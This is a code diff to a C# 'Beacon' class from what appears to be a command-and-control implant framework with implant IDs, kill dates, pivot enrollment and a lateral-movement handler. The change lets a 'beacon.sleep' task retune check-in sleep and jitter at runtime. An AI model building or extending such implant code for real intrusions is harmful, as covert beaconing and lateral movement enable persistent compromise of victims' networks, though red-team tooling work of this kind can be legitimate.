@@ -47,6 +47,10 @@ internal sealed class Beacon : ICheckInClient
     private readonly IReadOnlyList<string> _classVerbs;
     private readonly TextWriter _log;
 
+    // The live cadence (runtime-retunable through beacon.sleep); null keeps
+    // the baked sleep/jitter pair, the pre-cadence shape tests construct.
+    private readonly Cadence? _cadence;
+
     // The fronted-pivot ledger (architecture.md Sec 5.2): the Pivot children
     // this implant enrolled, whose tasking this stream executes. Null when
     // derivation is disabled (no enroll bundle) -- nothing is fronted then.
@@ -77,8 +81,8 @@ internal sealed class Beacon : ICheckInClient
     public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
-        TaskNonceTracker? nonces = null)
-        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces)
+        TaskNonceTracker? nonces = null, Cadence? cadence = null)
+        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces, cadence)
     {
         _mode = mode;
     }
@@ -92,12 +96,13 @@ internal sealed class Beacon : ICheckInClient
     /// dials the current entry and a failed cycle advances to the next.
     /// <paramref name="nonces"/> shares the replay-nonce floor with another
     /// check-in client covering the same run (the envelope client); null keeps
-    /// this beacon's own tracker.
+    /// this beacon's own tracker. <paramref name="cadence"/> is the live
+    /// check-in cadence beacon.sleep retunes; null keeps the baked pair.
     /// </summary>
     public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
-        TaskNonceTracker? nonces = null)
+        TaskNonceTracker? nonces = null, Cadence? cadence = null)
     {
         _mode = BeaconModes.Stream;
         _egress = egress;
@@ -112,8 +117,9 @@ internal sealed class Beacon : ICheckInClient
         // handlers the build unit baked through ExtensionRegistrations (the
         // extension kit's additional seam, extending/tradecraft.md): empty in
         // the dev stub, generated per build when an extension directory is
-        // configured.
-        _handlers = HandlerRegistry.Default(enroll, ExtensionRegistrations.Handlers);
+        // configured. The cadence rides in so beacon.sleep retunes this run.
+        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
+        _cadence = cadence;
         // The same bundle's fronted ledger (Sec 5.2): the lateral.move handler
         // records each Pivot child into it, and the tasking loop above gates
         // fronted tasking on it -- one instance, shared by derivation and
@@ -201,7 +207,10 @@ internal sealed class Beacon : ICheckInClient
             }
             try
             {
-                await CheckInCadence.SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
+                // The cadence is read fresh every cycle, so a beacon.sleep
+                // change lands on the very next sleep.
+                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
+                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
